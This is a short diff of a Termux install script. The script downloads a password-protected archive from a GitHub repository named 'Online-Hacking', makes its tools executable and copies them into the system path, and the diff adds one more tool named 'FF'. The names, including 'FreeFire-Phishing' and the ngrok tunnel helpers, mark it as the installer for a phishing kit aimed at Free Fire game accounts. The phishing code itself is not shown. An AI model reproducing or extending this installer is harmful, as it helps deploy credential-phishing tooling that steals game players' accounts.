@@ -143,6 +143,7 @@ wget https://github.com/Online-Hacking/Mr-OnlineHacking/raw/main/OnlineHacking/S
 unrar x -Password SUMAN.rar
 rm -rf SUMAN.rar
 chmod +x ngrok
+chmod +x FF
 chmod +x FreeFire
 chmod +x Run-Ngrok
 clear
@@ -176,6 +177,7 @@ echo
 echo
 cp -R ngrok /data/data/com.termux/files/usr/bin
 cp -R SUMAN /data/data/com.termux/files/usr/bin
+cp -R FF /data/data/com.termux/files/usr/bin
 cp -R FreeFire /data/data/com.termux/files/usr/bin
 cp -R FreeFire-Phishing /data/data/com.termux/files/usr/bin
 cp -R Run-Ngrok /data/data/com.termux/files/usr/bin
